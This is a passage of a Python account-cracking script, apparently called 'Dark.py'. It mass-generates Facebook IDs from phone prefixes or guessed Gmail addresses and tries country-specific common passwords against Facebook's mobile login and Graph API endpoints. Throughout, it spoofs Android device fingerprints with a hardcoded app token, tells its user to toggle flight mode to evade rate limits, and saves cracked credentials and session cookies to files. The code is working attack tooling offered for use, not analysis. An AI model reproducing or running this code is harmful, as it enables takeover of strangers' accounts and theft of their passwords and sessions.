            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total ids : \033[1;32m'+tl)
        print(f'\033[1;32m Cracking has been started')
        linex()
        print(f'\033[1;31mUSE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx, ids, 'Pakistan', 'khan1122',
                        'khan12345', 'khan123', 'khan123456', 'khankhan123']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def bd():
    user = []
    clear()
    print('\033[1;31m Code example: 016,017,018,019,015,013')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total ids : \033[1;32m'+tl)
        print(' \033[1;32m Cracking has been started')
        print(f'\033[1;31m USE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx, ids, 'first7digit', 'last7digit', 'first6digit', 'last6digit', 'fullnumber', 'first8digit', 'last8digit', 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire', 'pubg1234', '102030', '405060', '708090', '101010', '202020', '303030', '404040',
                        '505050', '606060', '707070', '808080', '909090', 'hacker1234', 'Sadia1234', 'Sumaiya1234', 'Mim1234', '121212', '232323', '343434', '565656', '787878', '898989', 'Bangladesh1234', 'bangladesh1234', 'freefire1234', 'Freefire1234', 'Gamer1234', 'gamer1234', 'Hacker1234', 'sadiya', 'sumaiya']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def indo():

    user = []

    clear()
    print('\033[1;31m Code example: 021,031,035,071,0411,etc')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total account : \033[1;32m'+tl)
        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
        linex()
        print(f'\033[1;31m USE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx

            passlist = [psx, psx[1:], "indonesia",
                        ids, 'free fire', 'freefire']

            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def gmail():
    os.system('rm -rf .re.txt')
    clear()
    print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
    linex()
    first = input(' Put first name: ')
    linex()
    print('\033[1;37m example: khan, awais, ali \033[1;97m')
    linex()
    last = input(' Put last name: ')
    linex()
    print(' Example: @gmail.com , @yahoo.com etc...')
    linex()
    domain = input(' domain: ')
    linex()
    try:
        limit = int(input(' Put limit: '))
    except ValueError:
        limit = 5000
    linex()
    print(' Getting gmails...')
    lists = ['3', '4']
    for xd in range(limit):
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = ''.join(random.choice(string.digits) for _ in range(3))
            open('.re.txt', 'a').write(first.lower() +
                                       last.lower()+mail+domain+'|'+first+' '+last+'\n')
        else:
            mail = ''.join(random.choice(string.digits) for _ in range(4))
            open('.re.txt', 'a').write(first.lower() +
                                       last.lower()+mail+domain+'|'+first+' '+last+'\n')
        fo = open('.re.txt', 'r').read().splitlines()
    with tred(max_workers=30) as Aking:
        total = str(len(fo))
        clear()
        print(' Total ids : \033[1;32m'+total)
        print("\033[1;32m Cracking has been Started")
        linex()
        print(f'\033[1;37mUSE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for user in fo:
            ids, names = user.split('|')
            first_name = names.rsplit(' ')[0]
            try:
                last_name = names.rsplit(' ')[1]
            except IndexError:
                last_name = 'Khan'
            fs = first_name.lower()
            ls = last_name.lower()
            passlist = [fs+ls, fs+' '+ls, fs+'123', fs+'12345',
                        fs+'1122', fs, fs+'1234', fs+'786', fs+'12']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(
                f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(
                getlog.text)).group(1), "uid": ids, "next": "https://free.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas, }
            complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',
                                    data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[Dark-OK] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global oks, loop, sim_id, device
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]

        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                "sim_country": "id",
                'try_num': '1',
                'family_device_id': family,
                'sim_serials': sim_serials,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'reg_instance': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'locale': fblc,
                'client_country_code': '',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)),
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def api1(ids, names, passlist):
    try:
        global oks, loop, sim_id
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                "cpl": "true",
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error_msg']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print("")
                    print('\r\r\033[1;37m[Dark-OK] ' +
                          str(uid)+' | '+pas+'\033[1;97m')
                    print('[🌺]=COOKIES ⬇')
                    cookies = ""
                    for k,v in po.cookies.items():
                        cookies += str(k) + "=" + str(v) + ";"
                    print('\r\r\033[1;32m %s' % cookies)
                    open('/sdcard/Dark-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass


try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
